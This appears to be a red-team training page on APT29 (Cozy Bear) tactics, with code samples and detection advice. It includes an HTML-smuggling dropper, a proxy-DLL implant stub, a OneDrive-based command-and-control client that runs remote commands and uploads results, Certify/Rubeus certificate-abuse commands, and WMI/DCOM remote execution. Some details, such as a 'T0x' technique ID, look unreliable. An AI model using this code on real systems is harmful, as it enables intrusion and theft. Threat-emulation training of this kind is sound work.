---
layout: training-page
title: "APT29 (Cozy Bear) Deep TTP Reference — Red Team Academy"
module: "Threat Actor Emulation"
tags:
  - apt29
  - cozy-bear
  - svr
  - russia
  - sunburst
  - supply-chain
  - azure-ad
page_key: "threat-actors-apt29"
render_with_liquid: false
---

# APT29 (Cozy Bear) Deep TTP Reference

APT29, also known as Cozy Bear, The Dukes, NOBELIUM (Microsoft), and Midnight Blizzard, is the cyber arm of Russia's SVR (Foreign Intelligence Service). Where APT28 is a blunt instrument, APT29 is surgical — prioritizing extreme stealth, long dwell time, and methodical intelligence collection over speed or impact.

## Attribution

| Attribute | Detail |
|---|---|
| Nation-state | Russian Federation |
| Organization | SVR (Служба внешней разведки — Foreign Intelligence Service) |
| MITRE Group ID | G0016 |
| Common aliases | Cozy Bear, The Dukes, NOBELIUM, Midnight Blizzard, Dark Halo, StellarParticle |
| Active since | ~2008 |
| Key attribution events | SUNBURST supply chain (2020), SolarWinds, Microsoft breach (2024) |

## Distinguishing APT29 from APT28

Understanding the difference is critical for accurate emulation:

| Property | APT28 (GRU/Unit 26165) | APT29 (SVR) |
|---|---|---|
| Parent organization | Military intelligence (GRU) | Foreign intelligence (SVR) |
| Operations tempo | Fast, aggressive, noisy acceptable | Slow, methodical, stealth-first |
| Dwell time | Weeks to months | Months to years (SolarWinds: 9+ months) |
| Destructive capability | Yes (influence ops, leaks) | Rarely; pure intelligence collection |
| Cloud focus | Limited | Extensive — Azure AD, M365, OAuth |
| Supply chain attacks | No | Yes — SolarWinds, Microsoft identity |
| Initial access tools | Custom + commodity | Custom loaders, HTML smuggling, OAuth |
| C2 method | Custom protocols, domain fronting | Legitimate cloud services (OneDrive, Dropbox) |
| Remediation difficulty | Hard | Extremely hard — cloud identity persistence |

## Initial Access

### T1027.006 — HTML Smuggling (ROOTSAW Downloader)

APT29 pioneered HTML smuggling as a delivery mechanism in 2021-2023. The malicious payload is encoded inside an HTML file using JavaScript's `Blob` API. When opened in a browser, it reconstructs and triggers a download of the payload — the malicious content never transits the network as a standalone file, defeating email gateway inspection.

```html
<!-- html_smuggling_concept.html — educational demonstration -->
<!-- In actual ROOTSAW campaigns: ISO or IMG container with DLL side-loading inside -->
<html>
<body>
<script>
    // Payload is base64-encoded inside the HTML — not a separate URL
    var b64payload = "TVqQAAMAAAAEAAAA...";  // base64 PE or ISO
    
    function b64ToArrayBuffer(b64) {
        var binary = atob(b64);
        var buf = new ArrayBuffer(binary.length);
        var view = new Uint8Array(buf);
        for (var i = 0; i < binary.length; i++) view[i] = binary.charCodeAt(i);
        return buf;
    }
    
    var blob = new Blob([b64ToArrayBuffer(b64payload)],
                        {type: 'application/octet-stream'});
    var a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = 'Invoice_2024.iso';  // lure filename
    document.body.appendChild(a);
    a.click();
</script>
<p>Loading document... please wait.</p>
</body>
</html>
```

**Detection:** Browsers creating files without a corresponding HTTP download in proxy logs. Mark-of-the-Web absent from HTML-smuggled files (delivered as blob). Sysmon file creation events for ISO/IMG files created by browser process.

### T1528 — OAuth Malicious App Registration

APT29's 2021 campaigns against US government targets and the 2024 Microsoft breach both used OAuth application consent as an initial access method:

1. Attacker creates a malicious Azure AD registered application
2. Target user receives a phishing email with a link to grant the app access to their M365 data
3. User consents to the app's requested permissions (Mail.Read, Files.ReadWrite.All)
4. Attacker uses the OAuth token — no password needed, MFA doesn't protect

```bash
# Detection: Monitor Azure AD audit logs for new OAuth app consent events
# Azure AD → Audit Logs → Application Activity → "Consent to application"
# Alert on: new apps requesting Mail.Read or Files.Read or User.Read permissions
# Especially: apps registered outside the tenant (external publisher)

# PowerShell: audit OAuth app consents
Connect-MgGraph -Scopes "AuditLog.Read.All"
Get-MgAuditLogSignIn -Filter "appDisplayName ne 'Microsoft'" | 
    Where-Object { $_.ResourceDisplayName -eq "Microsoft Graph" } |
    Select-Object AppDisplayName, UserPrincipalName, CreatedDateTime
```

## Persistence

### T1574.002 — DLL Side-Loading (SUNBURST Pattern)

The SUNBURST attack is the defining example of DLL side-loading for persistence and delivery:
1. Attacker compromised SolarWinds build server
2. Malicious code inserted into `SolarWinds.Orion.Core.BusinessLayer.dll` (legitimate DLL)
3. Trojanized DLL signed with SolarWinds certificate
4. Distributed via legitimate update mechanism to ~18,000 organizations

**Emulation (DLL side-loading without supply chain compromise):**
```
Target: Applications that load DLLs without full path validation
Method: Place malicious DLL in same directory as legitimate EXE
   before the legitimate DLL search path

Example:
  OneDrive.exe (loads version.dll from application directory)
  → Drop malicious version.dll in %LOCALAPPDATA%\Microsoft\OneDrive\
  → OneDrive loads malicious version.dll on next start
  → DllMain executes implant, then loads real version.dll from System32
```

```c
// proxy_dll.c — DLL side-loading via proxy DLL technique
// Forwards all exports to the legitimate DLL, but also runs implant
#include <windows.h>

// Load the real DLL from System32
HMODULE real_dll = NULL;

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Load the real DLL
        char sys32[MAX_PATH];
        GetSystemDirectoryA(sys32, MAX_PATH);
        strcat(sys32, "\\version.dll");
        real_dll = LoadLibraryA(sys32);

        // Execute implant in background thread
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)implant_thread, NULL, 0, NULL);
    }
    return TRUE;
}
```

## Defense Evasion

### T1055 — Process Injection into Legitimate Processes

APT29 injects implants into trusted system processes (svchost.exe, dllhost.exe, explorer.exe) to blend C2 traffic with normal system activity:

```powershell
# APT29-style: inject beacon into dllhost.exe
# dllhost.exe makes legitimate HTTPS connections — blends well
$dllhost_pids = Get-Process dllhost | Select-Object -ExpandProperty Id
$target_pid = $dllhost_pids[0]

# Injection proceeds via NtAllocateVirtualMemory + NtWriteVirtualMemory
# + NtCreateThreadEx (direct syscalls to avoid hooks — see shellcode-loaders.md)
```

### T1218.011 — Signed Binary Proxy Execution: Rundll32

APT29 uses `rundll32.exe` to execute malicious DLLs via signed Microsoft binary:

```cmd
:: Execute malicious DLL export via rundll32 (T1218.011)
rundll32.exe C:\ProgramData\MicrosoftEdge\malicious.dll,EntryPoint

:: Detection: rundll32 loading DLL from non-standard path
:: Sigma: proc_creation_win_rundll32_susp_params.yml
```

## Command and Control

### T1102 — C2 via Legitimate Cloud Services

APT29's trademark: using legitimate cloud storage services for C2 communication. The implant communicates exclusively with OneDrive, Google Drive, Dropbox, or GitHub — blending with normal organizational cloud usage.

```python
# apt29_style_c2_concept.py — C2 via OneDrive Graph API (educational concept)
# APT29 used this pattern in SUNSHUTTLE (2021) and SIBOT campaigns
import requests, json, time, base64

class OneDriveC2:
    def __init__(self, access_token):
        self.token = access_token
        self.headers = {"Authorization": f"Bearer {access_token}"}
        self.base_url = "https://graph.microsoft.com/v1.0"
        self.agent_id = "agent_01"
    
    def poll_for_commands(self):
        """Check for command file in attacker's OneDrive."""
        # Attacker drops file: /c2_drop/{agent_id}_cmd.txt
        url = f"{self.base_url}/me/drive/root:/c2_drop/{self.agent_id}_cmd.txt:/content"
        resp = requests.get(url, headers=self.headers, timeout=10)
        if resp.status_code == 200:
            return base64.b64decode(resp.content).decode()
        return None
    
    def send_result(self, result: str):
        """Upload result to attacker's OneDrive."""
        url = f"{self.base_url}/me/drive/root:/c2_drop/{self.agent_id}_res.txt:/content"
        requests.put(url, headers={**self.headers, "Content-Type": "text/plain"},
                     data=base64.b64encode(result.encode()), timeout=10)
    
    def loop(self):
        while True:
            cmd = self.poll_for_commands()
            if cmd:
                import subprocess
                result = subprocess.run(cmd, shell=True, capture_output=True).stdout
                self.send_result(result.decode(errors='replace'))
            time.sleep(3600 + (hash(time.time()) % 1800))  # ~1 hour jitter
```

**Detection:** Microsoft Graph API calls from unusual processes, especially `OneDrive.exe` uploading data it shouldn't. Azure AD sign-in logs showing application token usage from unusual locations/devices.

### T0x — TOR for Exfiltration

APT29 uses TOR exit nodes for exfiltration to prevent attribution of the destination IP. TOR traffic appears as HTTPS to the TOR network IP — unusual for most corporate environments.

**Detection:** Connections to known TOR exit node IPs (available from dan.me.uk/torlist/), unusual encrypted traffic on port 443 to IPs not in CDN ranges.

## Credential Access

### Azure AD Token Theft (T1528)

APT29 targeted Microsoft's corporate environment in 2024 via a legacy OAuth application. The attack flow:
1. Brute-force legacy authentication on a test OAuth app account
2. Use the compromised test account to access Azure AD Exchange Online
3. Steal OAuth tokens for additional application access
4. Pivot through Microsoft's internal network using stolen tokens

**Detection in Entra ID (Azure AD):**
```powershell
# Hunt for token theft indicators
# Impossible travel: same token used from geographically distant locations
Get-MgAuditLogSignIn -Filter "IsInteractive eq false" |
    Where-Object { $_.RiskLevelDuringSignIn -ne "none" } |
    Select-Object UserPrincipalName, IpAddress, Location, RiskLevelDuringSignIn

# Azure AD Identity Protection: "Atypical travel" risk detection
# Alert on: token used from multiple IPs within short time window
```

### T1649 — Pass-the-Certificate (ADCS Abuse)

APT29 targets Active Directory Certificate Services for long-term credential access. A valid AD CS certificate can be used for authentication indefinitely, survives password resets.

```powershell
# Request certificate for another user using vulnerable CA template (ESC1)
# Requires: Certify.exe (GhostPack) or Certipy (Python)

# Find vulnerable templates
.\Certify.exe find /vulnerable

# Request certificate for domain admin impersonation (ESC1)
.\Certify.exe request /ca:DC01.corp.example\CorpCA /template:User /altname:administrator

# Convert and authenticate with Rubeus
.\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:PfxPassword
```

### ADFS Golden SAML Attack (T1606.002)

APT29 stole ADFS (Active Directory Federation Services) token signing certificates to forge SAML tokens — the original technique discovered in the SolarWinds breach.

```
ADFS Token Signing Certificate → forge any SAML assertion → authenticate as any user
  → No password needed, MFA bypassed, survives identity cleanup

Detection: ADFS audit logs for certificate export events (Event ID 307)
           Unusual SAML assertions from unexpected IP ranges
           Monitor ADFS configuration for signing certificate changes
```

## APT29 Specific Tools

### SUNBURST
- **Type:** Backdoor DLL (trojanized SolarWinds Orion DLL)
- **C2:** HTTP/HTTPS with randomized URI patterns mimicking Orion API calls
- **Dormancy:** 2-week sleep before activating to avoid sandbox detection
- **Anti-analysis:** Checks for security tools, domain-joined status, specific processes before activating

### TEARDROP
- **Type:** Memory-only dropper (loaded by SUNBURST)
- **Purpose:** Loads Cobalt Strike beacon or custom Meterpreter-like payload
- **Evasion:** Custom file format (not PE) to evade file-based scanning; loaded by SUNBURST into memory

### RAINDROP
- **Type:** Cobalt Strike loader, variant of TEARDROP
- **Difference:** Different encoding/encryption than TEARDROP; likely different development cell
- **Delivery:** Deployed from SolarWinds compromise to specific high-value targets

### MagicWeb (ADFS Backdoor)
- **Type:** Authentication backdoor DLL for ADFS servers
- **Function:** Intercepts ADFS authentication, allows authentication with any username + a hardcoded password
- **Deployment:** Requires ADFS server code execution; discovered in 2022 in government network
- **Persistence:** Survives ADFS reinstallation if DLL is preserved; very difficult to detect

## Lateral Movement

### T1021.003 — DCOM Lateral Movement

```powershell
# APT29-style DCOM lateral movement (T1021.003)
# Uses Excel.Application or MMC20.Application COM objects for remote exec
$com_object = [Activator]::CreateInstance([Type]::GetTypeFromProgID("Excel.Application", "TARGET-HOST"))
$com_object.DisplayAlerts = $false
# Excel DCOM can execute macros on the remote host
```

### T1021.006 — WMI Lateral Movement

```powershell
# Remote WMI execution (T1021.006) — seen in APT29 post-compromise
$wmi_options = New-CimSessionOption -Protocol Dcom
$session = New-CimSession -ComputerName "TARGET-HOST" `
    -Credential (Get-Credential) -SessionOption $wmi_options
Invoke-CimMethod -CimSession $session -ClassName Win32_Process `
    -MethodName Create -Arguments @{CommandLine = "powershell -enc BASE64_CMD"}
```

## Detection Opportunities

| Technique | Alert Condition | Data Source |
|---|---|---|
| HTML smuggling delivery | Browser creating ISO/IMG file with no HTTP download | Proxy + endpoint |
| OAuth app consent | New app consent in Azure AD audit log | Azure AD |
| SUNBURST dormancy | Process sleeping 14+ days before network activity | EDR behavioral |
| OneDrive C2 | OneDrive API calls from unusual processes | Cloud app telemetry |
| ADFS cert theft | Event ID 307 (certificate export) on ADFS server | Windows Event Log |
| DCOM remote exec | DCOM connection from unusual source + process create | Sysmon/EDR |
| Pass-the-Certificate | Certificate authentication for account with no known cert | ADCS + AD logs |
| Golden SAML | SAML assertion from unexpected IP / non-standard times | ADFS + SIEM |

## References

- MITRE ATT&CK G0016 (APT29): attack.mitre.org/groups/G0016/
- CISA Advisory AA21-008A (SolarWinds): cisa.gov
- Microsoft blog: NOBELIUM/APT29 TTP evolution (2021-2024)
- Mandiant UNC2452/SUNBURST report (2020)
- CrowdStrike StellarParticle tracking of Cozy Bear
- ADFS Golden SAML attack: trufflesecurity.com/blog/dcsync-golden-saml
- MagicWeb analysis: microsoft.com/security/blog/2022/08/24/magicweb
